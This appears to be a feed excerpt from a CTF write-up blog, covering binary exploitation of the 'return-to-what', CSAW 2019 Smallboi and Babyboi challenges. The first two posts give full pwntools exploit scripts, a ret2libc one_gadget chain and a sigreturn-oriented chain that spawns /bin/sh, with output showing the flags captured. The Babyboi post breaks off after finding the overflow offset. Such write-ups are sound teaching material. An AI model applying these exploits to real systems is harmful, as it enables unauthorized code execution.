&lt;ul>
&lt;li>A &lt;code>pop rdi&lt;/code> instruction, so we can leak &lt;code>libc&lt;/code>.&lt;/li>
&lt;li>The &amp;lsquo;magic&amp;rsquo; gadget, so we can get a shell.&lt;/li>
&lt;/ul>
&lt;p>We can use the &lt;code>ropper&lt;/code> tool to find a &lt;code>pop rdi&lt;/code> instruction, easily found within the executable.&lt;/p>
&lt;pre>&lt;code>$ ropper --file ./return-to-what --search 'pop rdi'
[INFO] Load gadgets for section: LOAD
[LOAD] loading... 100%
[LOAD] removing double gadgets... 100%
[INFO] Searching for gadgets: pop rdi
[INFO] File: ./return-to-what
0x000000000040122b: pop rdi; ret;
&lt;/code>&lt;/pre>&lt;p>Using the &lt;code>one_gadget&lt;/code> tool, we can find a &amp;lsquo;magic&amp;rsquo; gadget that&amp;rsquo;ll immediately give us a shell, provided we meet the conditions. We just need a rop gadget that will help us set this up.&lt;/p>
&lt;pre>&lt;code>$ one_gadget /usr/lib/x86_64-linux-gnu/libc-2.31.so
0xcbd1a execve(&amp;quot;/bin/sh&amp;quot;, r12, r13)
constraints:
[r12] == NULL || r12 == NULL
[r13] == NULL || r13 == NULL
0xcbd1d execve(&amp;quot;/bin/sh&amp;quot;, r12, rdx)
constraints:
[r12] == NULL || r12 == NULL
[rdx] == NULL || rdx == NULL
0xcbd20 execve(&amp;quot;/bin/sh&amp;quot;, rsi, rdx)
constraints:
[rsi] == NULL || rsi == NULL
[rdx] == NULL || rdx == NULL
&lt;/code>&lt;/pre>&lt;p>The &amp;lsquo;magic&amp;rsquo; gadget I like the most is the first one, so let&amp;rsquo;s find a gadget that&amp;rsquo;ll set this up. We&amp;rsquo;ll use &lt;code>ropper&lt;/code> again.&lt;/p>
&lt;pre>&lt;code>$ ropper --file ./return-to-what --search 'pop r12'
[INFO] Load gadgets from cache
[LOAD] loading... 100%
[LOAD] removing double gadgets... 100%
[INFO] Searching for gadgets: pop r12
[INFO] File: ./return-to-what
0x0000000000401224: pop r12; pop r13; pop r14; pop r15; ret;
&lt;/code>&lt;/pre>&lt;h2 id="information-gathering">Information Gathering&lt;/h2>
&lt;p>Now that we&amp;rsquo;ve found everything we need, we can do a little more information gathering to get the last thing we need for our exploit - the offset of the return address from our input buffer.&lt;/p>
&lt;p>Here&amp;rsquo;s a quick script that&amp;rsquo;ll attach the process to GDB before sending a large cyclic pattern of bytes to it, allowing us to find the offset of the return address.&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4">&lt;code class="language-py" data-lang="py">&lt;span style="color:#75715e">#!/usr/bin/env python3&lt;/span>
&lt;span style="color:#f92672">from&lt;/span> pwn &lt;span style="color:#f92672">import&lt;/span> &lt;span style="color:#f92672">*&lt;/span>
r &lt;span style="color:#f92672">=&lt;/span> process(&lt;span style="color:#e6db74">&amp;#39;./return-to-what&amp;#39;&lt;/span>)
gdb&lt;span style="color:#f92672">.&lt;/span>attach(r)
r&lt;span style="color:#f92672">.&lt;/span>clean()
r&lt;span style="color:#f92672">.&lt;/span>writeline(cyclic(&lt;span style="color:#ae81ff">100&lt;/span>, n&lt;span style="color:#f92672">=&lt;/span>&lt;span style="color:#ae81ff">8&lt;/span>))
r&lt;span style="color:#f92672">.&lt;/span>interactive()
&lt;/code>&lt;/pre>&lt;/div>&lt;p>After continuing in GDB and letting the program crash, we can see what was stored in the return address.&lt;/p>
&lt;pre>&lt;code> ► 0x4011ac &amp;lt;vuln+39&amp;gt; ret &amp;lt;0x6161616161616168&amp;gt;
&lt;/code>&lt;/pre>&lt;p>Using pwntools' &lt;code>cyclic_find&lt;/code> function, we can use the value we found above to calculate the offset of the return address from our input buffer.&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4">&lt;code class="language-py" data-lang="py">In [&lt;span style="color:#ae81ff">2&lt;/span>]: cyclic_find(&lt;span style="color:#ae81ff">0x6161616161616168&lt;/span>, n&lt;span style="color:#f92672">=&lt;/span>&lt;span style="color:#ae81ff">8&lt;/span>)
Out[&lt;span style="color:#ae81ff">2&lt;/span>]: &lt;span style="color:#ae81ff">56&lt;/span>
&lt;/code>&lt;/pre>&lt;/div>&lt;h2 id="exploit-development">Exploit Development&lt;/h2>
&lt;p>Now that we have everything we need, we can begin to write our exploit. There&amp;rsquo;s quite a few things that we need to achieve, here&amp;rsquo;s a list:&lt;/p>
&lt;ul>
&lt;li>Overwrite the return address to get control of process execution.&lt;/li>
&lt;li>Use &lt;code>puts&lt;/code> to print the value of &lt;code>puts&lt;/code> stored in the global offset table (a &lt;code>libc&lt;/code> address).&lt;/li>
&lt;li>Capture the leaked &lt;code>libc&lt;/code> address, and subtract the offset of the &lt;code>puts&lt;/code> address to get the start address of &lt;code>libc&lt;/code>.&lt;/li>
&lt;li>Use the leaked &lt;code>libc&lt;/code> address to redirect process execution to our &amp;lsquo;magic&amp;rsquo; gadget to get a shell.&lt;/li>
&lt;/ul>
&lt;p>Keep in mind that we need to setup carefully for the &amp;lsquo;magic&amp;rsquo; gadget, as it&amp;rsquo;ll only execute under specific circumstances.&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4">&lt;code class="language-py" data-lang="py">&lt;span style="color:#75715e">#!/usr/bin/env python3&lt;/span>
&lt;span style="color:#f92672">from&lt;/span> pwn &lt;span style="color:#f92672">import&lt;/span> &lt;span style="color:#f92672">*&lt;/span>
context&lt;span style="color:#f92672">.&lt;/span>clear(arch&lt;span style="color:#f92672">=&lt;/span>&lt;span style="color:#e6db74">&amp;#39;amd64&amp;#39;&lt;/span>)
pad &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#e6db74">b&lt;/span>&lt;span style="color:#e6db74">&amp;#39;A&amp;#39;&lt;/span> &lt;span style="color:#f92672">*&lt;/span> &lt;span style="color:#ae81ff">56&lt;/span>
&lt;span style="color:#e6db74">&amp;#39;&amp;#39;&amp;#39;
&lt;/span>&lt;span style="color:#e6db74">0x000000000040122b: pop rdi; ret;
&lt;/span>&lt;span style="color:#e6db74">&amp;#39;&amp;#39;&amp;#39;&lt;/span>
pop_rdi &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#ae81ff">0x040122b&lt;/span>
&lt;span style="color:#e6db74">&amp;#39;&amp;#39;&amp;#39;
&lt;/span>&lt;span style="color:#e6db74">0x0000000000401224: pop r12; pop r13; pop r14; pop r15; ret;
&lt;/span>&lt;span style="color:#e6db74">&amp;#39;&amp;#39;&amp;#39;&lt;/span>
setup &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#ae81ff">0x0401224&lt;/span>
r &lt;span style="color:#f92672">=&lt;/span> process(&lt;span style="color:#e6db74">&amp;#39;./return-to-what&amp;#39;&lt;/span>)
elf &lt;span style="color:#f92672">=&lt;/span> ELF(&lt;span style="color:#e6db74">&amp;#39;./return-to-what&amp;#39;&lt;/span>)
rop &lt;span style="color:#f92672">=&lt;/span> ROP(elf)
&lt;span style="color:#75715e"># pop rdi; ret&lt;/span>
rop&lt;span style="color:#f92672">.&lt;/span>raw(pop_rdi)
rop&lt;span style="color:#f92672">.&lt;/span>raw(elf&lt;span style="color:#f92672">.&lt;/span>got[&lt;span style="color:#e6db74">&amp;#39;puts&amp;#39;&lt;/span>]) &lt;span style="color:#75715e"># pop rdi&lt;/span>
&lt;span style="color:#75715e"># puts&lt;/span>
rop&lt;span style="color:#f92672">.&lt;/span>raw(elf&lt;span style="color:#f92672">.&lt;/span>plt[&lt;span style="color:#e6db74">&amp;#39;puts&amp;#39;&lt;/span>]) &lt;span style="color:#75715e"># puts(puts)&lt;/span>
&lt;span style="color:#75715e"># main&lt;/span>
rop&lt;span style="color:#f92672">.&lt;/span>raw(elf&lt;span style="color:#f92672">.&lt;/span>sym[&lt;span style="color:#e6db74">&amp;#39;main&amp;#39;&lt;/span>])
r&lt;span style="color:#f92672">.&lt;/span>clean()
r&lt;span style="color:#f92672">.&lt;/span>writeline(pad &lt;span style="color:#f92672">+&lt;/span> rop&lt;span style="color:#f92672">.&lt;/span>chain())
leak &lt;span style="color:#f92672">=&lt;/span> r&lt;span style="color:#f92672">.&lt;/span>readline()[:&lt;span style="color:#f92672">-&lt;/span>&lt;span style="color:#ae81ff">1&lt;/span>]
leak &lt;span style="color:#f92672">=&lt;/span> unpack(leak, len(leak) &lt;span style="color:#f92672">*&lt;/span> &lt;span style="color:#ae81ff">8&lt;/span>)
libc &lt;span style="color:#f92672">=&lt;/span> leak &lt;span style="color:#f92672">-&lt;/span> &lt;span style="color:#ae81ff">0x765f0&lt;/span>
magic &lt;span style="color:#f92672">=&lt;/span> libc &lt;span style="color:#f92672">+&lt;/span> &lt;span style="color:#ae81ff">0xcbd1a&lt;/span>
rop &lt;span style="color:#f92672">=&lt;/span> ROP(elf)
&lt;span style="color:#75715e"># setup &lt;/span>
rop&lt;span style="color:#f92672">.&lt;/span>raw(setup)
rop&lt;span style="color:#f92672">.&lt;/span>raw(&lt;span style="color:#ae81ff">0&lt;/span>) &lt;span style="color:#75715e"># pop r12&lt;/span>
rop&lt;span style="color:#f92672">.&lt;/span>raw(&lt;span style="color:#ae81ff">0&lt;/span>) &lt;span style="color:#75715e"># pop r13&lt;/span>
rop&lt;span style="color:#f92672">.&lt;/span>raw(&lt;span style="color:#ae81ff">0&lt;/span>) &lt;span style="color:#75715e"># pop r14&lt;/span>
rop&lt;span style="color:#f92672">.&lt;/span>raw(&lt;span style="color:#ae81ff">0&lt;/span>) &lt;span style="color:#75715e"># pop r15&lt;/span>
&lt;span style="color:#75715e"># magic gadget&lt;/span>
rop&lt;span style="color:#f92672">.&lt;/span>raw(magic)
r&lt;span style="color:#f92672">.&lt;/span>writeline(pad &lt;span style="color:#f92672">+&lt;/span> rop&lt;span style="color:#f92672">.&lt;/span>chain())
r&lt;span style="color:#f92672">.&lt;/span>clean()
r&lt;span style="color:#f92672">.&lt;/span>interactive()
&lt;/code>&lt;/pre>&lt;/div>&lt;p>And finally, here&amp;rsquo;s our exploit in action. It gives us an interactive shell that we can use to read the flag.&lt;/p>
&lt;pre>&lt;code>$ ./exploit.py
[+] Starting local process './return-to-what': pid 2145
[*] './return-to-what'
Arch: amd64-64-little
RELRO: Partial RELRO
Stack: No canary found
NX: NX enabled
PIE: No PIE (0x400000)
[*] Loaded 14 cached gadgets for './return-to-what'
[*] Switching to interactive mode
$ cat flag.txt
DUCTF{ret_pUts_ret_main_ret_where???}
$
[*] Stopped process './return-to-what' (pid 2145)
&lt;/code>&lt;/pre></content></item><item><title>CSAW 2019 :: Smallboi</title><link>https://anvbis.github.io/posts/csaw-2019-smallboi/</link><pubDate>Sun, 15 Aug 2021 00:00:00 +0000</pubDate><guid>https://anvbis.github.io/posts/csaw-2019-smallboi/</guid><description>Reverse Engineering Like usual, we&amp;rsquo;ll start by running file to get a brief overflow of the executable&amp;rsquo;s architecture. Note that it is a 64-bit linux executable.
$ ./small_boi ./small_boi: ELF 64-bit LSB executable, x86-64, version 1 (SYSV), statically linked, BuildID[sha1]=070f96f86ab197c06c4a6896c26254cce3d57650, stripped Running checksec reveals that the only exploit protection in place is that the NX bit is enabled. Meaning we won&amp;rsquo;t be able to execute any shellcode on the stack.</description><content>&lt;h2 id="reverse-engineering">Reverse Engineering&lt;/h2>
&lt;p>Like usual, we&amp;rsquo;ll start by running &lt;code>file&lt;/code> to get a brief overflow of the executable&amp;rsquo;s architecture. Note that it is a 64-bit linux executable.&lt;/p>
&lt;pre>&lt;code>$ ./small_boi
./small_boi: ELF 64-bit LSB executable, x86-64, version 1 (SYSV), statically linked, BuildID[sha1]=070f96f86ab197c06c4a6896c26254cce3d57650, stripped
&lt;/code>&lt;/pre>&lt;p>Running &lt;code>checksec&lt;/code> reveals that the only exploit protection in place is that the NX bit is enabled. Meaning we won&amp;rsquo;t be able to execute any shellcode on the stack.&lt;/p>
&lt;pre>&lt;code>$ checksec ./small_boi
[*] './small_boi'
Arch: amd64-64-little
RELRO: No RELRO
Stack: No canary found
NX: NX enabled
PIE: No PIE (0x400000)
&lt;/code>&lt;/pre>&lt;p>Running the executable reveals that it, at some point, takes user input. We&amp;rsquo;ll need to investigate this further to determine whether there is a vulnerability present.&lt;/p>
&lt;pre>&lt;code>$ ./small_boi
asdfsadf
&lt;/code>&lt;/pre>&lt;p>Viewing the disassembly of the entrypoint reveals that it calls some unknown function before it makes an &lt;code>exit&lt;/code> syscall.&lt;/p>
&lt;pre>&lt;code>entry0 ();
0x004001ad push rbp
0x004001ae mov rbp, rsp
0x004001b1 mov eax, 0
0x004001b6 call fcn.0040018c
0x004001bb xor rax, rdi
0x004001be mov rax, 0x3c ; '&amp;lt;' ; 60
0x004001c5 syscall ; exit(...)
0x004001c7 nop
0x004001c8 pop rbp
0x004001c9 ret
&lt;/code>&lt;/pre>&lt;p>Disassembling the function called within the entrypoint reveals a likely buffer overflow vulnerability.&lt;/p>
&lt;p>We can see that the function reads 512 bytes of data in from &lt;code>stdin&lt;/code> and stores it at a location only 32 bytes below the base of the function&amp;rsquo;s stack frame.&lt;/p>
&lt;pre>&lt;code>fcn.0040018c ();
; var int64_t var_20h @ rbp-0x20
0x0040018c push rbp
0x0040018d mov rbp, rsp
0x00400190 lea rax, [var_20h] ; rax = *var_20h
0x00400194 mov rsi, rax ; rsi = rax = *var_20h
0x00400197 xor rax, rax ; rax = 0
0x0040019a xor rdi, rdi ; rdi = 0
0x0040019d mov rdx, 0x200 ; rdx = 512
0x004001a4 syscall ; read(stdin, *var_20h, 512)
0x004001a6 mov eax, 0
0x004001ab pop rbp
0x004001ac ret
&lt;/code>&lt;/pre>&lt;p>Looking at the disassembly for the &lt;code>.text&lt;/code> section, we can see a sigreturn syscall. We can use this to execute any arbitrary syscall with a forged sigreturn frame.&lt;/p>
&lt;pre>&lt;code>;-- section..text:
0x0040017c push rbp ; [02] -r-x section size 78 named .text
0x0040017d mov rbp, rsp
0x00400180 mov eax, 0xf ; 15
0x00400185 syscall ; rt_sigreturn(...)
0x00400187 nop
0x00400188 pop rbp
0x00400189 ret
&lt;/code>&lt;/pre>&lt;p>We also discover a &lt;code>&amp;quot;/bin/sh&amp;quot;&lt;/code> string stored in the &lt;code>.rodata&lt;/code> section. This could be very useful - however, I&amp;rsquo;m going to avoid using it.&lt;/p>
&lt;p>I believe there should be another solution (albeit a more complex solution) that allows us to avoid using this string. I&amp;rsquo;ve arbitrarily decided that it feels a little like cheating.&lt;/p>
&lt;pre>&lt;code>;-- str.bin_sh:
;-- section..rodata:
0x004001ca .string &amp;quot;/bin/sh&amp;quot; ; len=8 ; [03] -r-- section size 8 named .rodata
&lt;/code>&lt;/pre>&lt;p>For our alternative solution, we need to find a section within the binary that we have write permissions for.&lt;/p>
&lt;p>Using &lt;code>readelf&lt;/code>, we can see that we have write permissions for the &lt;code>.data&lt;/code> section, stored at &lt;code>0x601000&lt;/code>. We&amp;rsquo;ll use this location to write a &lt;code>&amp;quot;/bin/sh&amp;quot;&lt;/code> string, and pivot our stack.&lt;/p>
&lt;pre>&lt;code>$ readelf --sections ./small_boi
There are 9 section headers, starting at offset 0x1090:
Section Headers:
[Nr] Name Type Address Offset
Size EntSize Flags Link Info Align
[ 0] NULL 0000000000000000 00000000
0000000000000000 0000000000000000 0 0 0
[ 1] .note.gnu.bu[...] NOTE 0000000000400158 00000158
0000000000000024 0000000000000000 A 0 0 4
[ 2] .text PROGBITS 000000000040017c 0000017c
000000000000004e 0000000000000000 AX 0 0 1
[ 3] .rodata PROGBITS 00000000004001ca 000001ca
0000000000000008 0000000000000000 A 0 0 1
[ 4] .eh_frame_hdr PROGBITS 00000000004001d4 000001d4
0000000000000024 0000000000000000 A 0 0 4
[ 5] .eh_frame PROGBITS 00000000004001f8 000001f8
0000000000000078 0000000000000000 A 0 0 8
[ 6] .data PROGBITS 0000000000601000 00001000
0000000000000010 0000000000000000 WA 0 0 8
[ 7] .comment PROGBITS 0000000000000000 00001010
000000000000002a 0000000000000001 MS 0 0 1
[ 8] .shstrtab STRTAB 0000000000000000 0000103a
0000000000000053 0000000000000000 0 0 1
&lt;/code>&lt;/pre>&lt;h2 id="information-gathering">Information Gathering&lt;/h2>
&lt;p>Let&amp;rsquo;s do a little more information gathering before we write our exploit. We just need to find the offset of the return address from the start of the input buffer.&lt;/p>
&lt;p>Here&amp;rsquo;s a quick script that&amp;rsquo;ll send a cyclic pattern of bytes to the input that we can use to find the offset of the return address.&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4">&lt;code class="language-py" data-lang="py">&lt;span style="color:#75715e">#!/usr/bin/env python3&lt;/span>
&lt;span style="color:#f92672">from&lt;/span> pwn &lt;span style="color:#f92672">import&lt;/span> &lt;span style="color:#f92672">*&lt;/span>
r &lt;span style="color:#f92672">=&lt;/span> process(&lt;span style="color:#e6db74">&amp;#39;./small_boi&amp;#39;&lt;/span>)
gdb&lt;span style="color:#f92672">.&lt;/span>attach(r)
r&lt;span style="color:#f92672">.&lt;/span>clean()
r&lt;span style="color:#f92672">.&lt;/span>writeline(cyclic(&lt;span style="color:#ae81ff">512&lt;/span>, n&lt;span style="color:#f92672">=&lt;/span>&lt;span style="color:#ae81ff">8&lt;/span>))
r&lt;span style="color:#f92672">.&lt;/span>interactive()
&lt;/code>&lt;/pre>&lt;/div>&lt;p>Continuing in GDB, and letting the executable crash, reveals the data that overwrote the value of the return address.&lt;/p>
&lt;pre>&lt;code> ► 0x4001ac ret &amp;lt;0x6161616161616166&amp;gt;
&lt;/code>&lt;/pre>&lt;p>Using pwntools' &lt;code>cyclic_find&lt;/code> function, and using the value above, we can find the offset of the return address from the start of our input buffer.&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4">&lt;code class="language-py" data-lang="py">In [&lt;span style="color:#ae81ff">2&lt;/span>]: cyclic_find(&lt;span style="color:#ae81ff">0x6161616161616166&lt;/span>, n&lt;span style="color:#f92672">=&lt;/span>&lt;span style="color:#ae81ff">8&lt;/span>)
Out[&lt;span style="color:#ae81ff">2&lt;/span>]: &lt;span style="color:#ae81ff">40&lt;/span>
&lt;/code>&lt;/pre>&lt;/div>&lt;h2 id="exploit-development">Exploit Development&lt;/h2>
&lt;p>We can chain sigreturn instructions to perform a &lt;code>read&lt;/code> syscall and store &lt;code>&amp;quot;/bin/sh&amp;quot;&lt;/code> in memory, before making another sigreturn call to execute &lt;code>execve&lt;/code> with our &lt;code>&amp;quot;/bin/sh&amp;quot;&lt;/code> string.&lt;/p>
&lt;p>We just need to make sure that our first forged sigreturn frame maintains &lt;code>$rip&lt;/code> and pivots the stack to &lt;code>.data&lt;/code>, where we can continue execution.&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4">&lt;code class="language-py" data-lang="py">&lt;span style="color:#75715e">#!/usr/bin/env python3&lt;/span>
&lt;span style="color:#f92672">from&lt;/span> pwn &lt;span style="color:#f92672">import&lt;/span> &lt;span style="color:#f92672">*&lt;/span>
context&lt;span style="color:#f92672">.&lt;/span>clear(arch&lt;span style="color:#f92672">=&lt;/span>&lt;span style="color:#e6db74">&amp;#39;amd64&amp;#39;&lt;/span>)
pad &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#e6db74">b&lt;/span>&lt;span style="color:#e6db74">&amp;#39;A&amp;#39;&lt;/span>&lt;span style="color:#f92672">*&lt;/span>&lt;span style="color:#ae81ff">40&lt;/span>
&lt;span style="color:#75715e"># address of sigreturn syscall&lt;/span>
sigret &lt;span style="color:#f92672">=&lt;/span> p64(&lt;span style="color:#ae81ff">0x00400180&lt;/span>)
&lt;span style="color:#75715e"># address of &amp;#34;/bin/sh&amp;#34; string &lt;/span>
bin_sh &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#ae81ff">0x004001ca&lt;/span>
&lt;span style="color:#75715e"># address of syscall instruction&lt;/span>
&lt;span style="color:#e6db74">&amp;#39;&amp;#39;&amp;#39;
&lt;/span>&lt;span style="color:#e6db74">syscall; nop; pop rbp; ret
&lt;/span>&lt;span style="color:#e6db74">&amp;#39;&amp;#39;&amp;#39;&lt;/span>
syscall &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#ae81ff">0x0400185&lt;/span>
&lt;span style="color:#75715e"># address of data section&lt;/span>
data &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#ae81ff">0x00601000&lt;/span>
read_frame &lt;span style="color:#f92672">=&lt;/span> SigreturnFrame()
read_frame&lt;span style="color:#f92672">.&lt;/span>rax &lt;span style="color:#f92672">=&lt;/span> constants&lt;span style="color:#f92672">.&lt;/span>SYS_read
read_frame&lt;span style="color:#f92672">.&lt;/span>rdi &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#ae81ff">0&lt;/span>
read_frame&lt;span style="color:#f92672">.&lt;/span>rsi &lt;span style="color:#f92672">=&lt;/span> data
read_frame&lt;span style="color:#f92672">.&lt;/span>rdx &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#ae81ff">1000&lt;/span>
read_frame&lt;span style="color:#f92672">.&lt;/span>rip &lt;span style="color:#f92672">=&lt;/span> syscall
read_frame&lt;span style="color:#f92672">.&lt;/span>rsp &lt;span style="color:#f92672">=&lt;/span> data &lt;span style="color:#f92672">+&lt;/span> &lt;span style="color:#ae81ff">8&lt;/span>
read_frame &lt;span style="color:#f92672">=&lt;/span> bytes(read_frame)
execve_frame &lt;span style="color:#f92672">=&lt;/span> SigreturnFrame()
execve_frame&lt;span style="color:#f92672">.&lt;/span>rax &lt;span style="color:#f92672">=&lt;/span> constants&lt;span style="color:#f92672">.&lt;/span>SYS_execve
execve_frame&lt;span style="color:#f92672">.&lt;/span>rdi &lt;span style="color:#f92672">=&lt;/span> data
execve_frame&lt;span style="color:#f92672">.&lt;/span>rsi &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#ae81ff">0&lt;/span>
execve_frame&lt;span style="color:#f92672">.&lt;/span>rdx &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#ae81ff">0&lt;/span>
execve_frame&lt;span style="color:#f92672">.&lt;/span>rip &lt;span style="color:#f92672">=&lt;/span> syscall
execve_frame &lt;span style="color:#f92672">=&lt;/span> bytes(execve_frame)
r &lt;span style="color:#f92672">=&lt;/span> process(&lt;span style="color:#e6db74">&amp;#39;./small_boi&amp;#39;&lt;/span>)
r&lt;span style="color:#f92672">.&lt;/span>clean()
r&lt;span style="color:#f92672">.&lt;/span>writeline(pad &lt;span style="color:#f92672">+&lt;/span> sigret &lt;span style="color:#f92672">+&lt;/span> read_frame)
r&lt;span style="color:#f92672">.&lt;/span>clean(&lt;span style="color:#ae81ff">1&lt;/span>)
r&lt;span style="color:#f92672">.&lt;/span>writeline(&lt;span style="color:#e6db74">b&lt;/span>&lt;span style="color:#e6db74">&amp;#39;/bin/sh&lt;/span>&lt;span style="color:#ae81ff">\x00&lt;/span>&lt;span style="color:#e6db74">&amp;#39;&lt;/span> &lt;span style="color:#f92672">+&lt;/span> &lt;span style="color:#e6db74">b&lt;/span>&lt;span style="color:#e6db74">&amp;#39;A&amp;#39;&lt;/span>&lt;span style="color:#f92672">*&lt;/span>&lt;span style="color:#ae81ff">8&lt;/span> &lt;span style="color:#f92672">+&lt;/span> sigret &lt;span style="color:#f92672">+&lt;/span> execve_frame)
r&lt;span style="color:#f92672">.&lt;/span>clean()
r&lt;span style="color:#f92672">.&lt;/span>interactive()
&lt;/code>&lt;/pre>&lt;/div>&lt;p>And finally, here&amp;rsquo;s our exploit in action.&lt;/p>
&lt;pre>&lt;code>$ ./exploit.py
[+] Starting local process './small_boi': pid 2731
[*] Switching to interactive mode
$ cat flag.txt
csaw19{smallboi}
$
[*] Stopped process './small_boi' (pid 2731)
&lt;/code>&lt;/pre></content></item><item><title>CSAW 2019 :: Babyboi</title><link>https://anvbis.github.io/posts/csaw-2019-babyboi/</link><pubDate>Sat, 14 Aug 2021 00:00:00 +0000</pubDate><guid>https://anvbis.github.io/posts/csaw-2019-babyboi/</guid><description>Reverse Engineering Let&amp;rsquo;s use the file command to get a little bit of insight into this executable. Note that it is a 64-bit linux binary.
$ file ./baby_boi baby_boi: ELF 64-bit LSB executable, x86-64, version 1 (SYSV), dynamically linked, interpreter /lib64/ld-linux-x86-64.so.2, for GNU/Linux 3.2.0, BuildID[sha1]=e1ff55dce2efc89340b86a666bba5e7ff2b37f62, not stripped We can also use pwntools' checksec tool to see what exploit protections it has in place. Note that the NX bit is set, but there is no stack canary, and PIE is disabled.</description><content>&lt;h2 id="reverse-engineering">Reverse Engineering&lt;/h2>
&lt;p>Let&amp;rsquo;s use the &lt;code>file&lt;/code> command to get a little bit of insight into this executable. Note that it is a 64-bit linux binary.&lt;/p>
&lt;pre>&lt;code>$ file ./baby_boi
baby_boi: ELF 64-bit LSB executable, x86-64, version 1 (SYSV), dynamically linked, interpreter /lib64/ld-linux-x86-64.so.2, for GNU/Linux 3.2.0, BuildID[sha1]=e1ff55dce2efc89340b86a666bba5e7ff2b37f62, not stripped
&lt;/code>&lt;/pre>&lt;p>We can also use pwntools' &lt;code>checksec&lt;/code> tool to see what exploit protections it has in place. Note that the NX bit is set, but there is no stack canary, and PIE is disabled.&lt;/p>
&lt;p>This means a couple things for us:&lt;/p>
&lt;ul>
&lt;li>We can&amp;rsquo;t execute shellcode on the stack.&lt;/li>
&lt;li>Probably vulnerable to a BOF as there is no stack canary.&lt;/li>
&lt;li>We might be able to build a ROP chain somewhere.&lt;/li>
&lt;/ul>
&lt;pre>&lt;code>checksec ./baby_boi
[*] './baby_boi'
Arch: amd64-64-little
RELRO: Partial RELRO
Stack: No canary found
NX: NX enabled
PIE: No PIE (0x400000)
&lt;/code>&lt;/pre>&lt;p>Let&amp;rsquo;s run the executable and see what happens. The binary appears to leak some address (kinda looks like an address in &lt;code>libc&lt;/code>, we&amp;rsquo;ll definitely be able to use this).&lt;/p>
&lt;p>It also appears to prompt us for input. This is likely where we&amp;rsquo;ll find a vulnerability we can exploit.&lt;/p>
&lt;pre>&lt;code>$ ./baby_boi
Hello!
Here I am: 0x7f6b6221ecf0
asdfasdf
&lt;/code>&lt;/pre>&lt;p>Reversing the &lt;code>main&lt;/code> function reveals that the address leaked is indeed within &lt;code>libc&lt;/code>, it points to &lt;code>printf&lt;/code>. We&amp;rsquo;ll keep this in mind for later.&lt;/p>
&lt;pre>&lt;code>0x004006fc 488b05e50820. mov rax, qword [reloc.printf] ; sym..got
0x00400703 4889c6 mov rsi, rax
0x00400706 488d3dae0000. lea rdi, str.Here_I_am:__p_n ; 0x4007bb ; &amp;quot;Here I am: %p\n&amp;quot;
0x0040070d b800000000 mov eax, 0
0x00400712 e879feffff call sym..plt.got
&lt;/code>&lt;/pre>&lt;p>Towards the end of the &lt;code>main&lt;/code> function a call to &lt;code>gets&lt;/code> is made. Wonderful, we&amp;rsquo;ve found a buffer overflow vulnerability.&lt;/p>
&lt;pre>&lt;code>0x00400717 488d45e0 lea rax, [s]
0x0040071b 4889c7 mov rdi, rax ; char *s
0x0040071e b800000000 mov eax, 0
0x00400723 e848feffff call sym.imp.gets ; char *gets(char *s)
0x00400728 b800000000 mov eax, 0
0x0040072d c9 leave
0x0040072e c3 ret
&lt;/code>&lt;/pre>&lt;h2 id="information-gathering">Information Gathering&lt;/h2>
&lt;p>First, let&amp;rsquo;s find the offset of the return address from the input buffer &lt;code>*s&lt;/code> where &lt;code>gets&lt;/code> stores our user input.&lt;/p>
&lt;p>This is a small script that attaches the process to GDB before sending a large cyclic pattern of bytes. We can use this to determine the return address' offset.&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4">&lt;code class="language-py" data-lang="py">&lt;span style="color:#75715e">#!/usr/bin/env python3&lt;/span>
&lt;span style="color:#f92672">from&lt;/span> pwn &lt;span style="color:#f92672">import&lt;/span> &lt;span style="color:#f92672">*&lt;/span>
r &lt;span style="color:#f92672">=&lt;/span> process(&lt;span style="color:#e6db74">&amp;#39;./baby_boi&amp;#39;&lt;/span>)
gdb&lt;span style="color:#f92672">.&lt;/span>attach(r)
r&lt;span style="color:#f92672">.&lt;/span>clean()
r&lt;span style="color:#f92672">.&lt;/span>writeline(cyclic(&lt;span style="color:#ae81ff">300&lt;/span>, n&lt;span style="color:#f92672">=&lt;/span>&lt;span style="color:#ae81ff">8&lt;/span>))
r&lt;span style="color:#f92672">.&lt;/span>interactive()
&lt;/code>&lt;/pre>&lt;/div>&lt;p>After continuing in GDB, and looking at the top of the stack we can see we&amp;rsquo;ve overwritten the return address with our garbage data.&lt;/p>
&lt;pre>&lt;code> ► 0x40072e &amp;lt;main+167&amp;gt; ret &amp;lt;0x6161616161616166&amp;gt;
&lt;/code>&lt;/pre>&lt;p>Let&amp;rsquo;s use pwntools' &lt;code>cyclic_find&lt;/code> function to calculate the offset of the return address from the start of our input.&lt;/p>
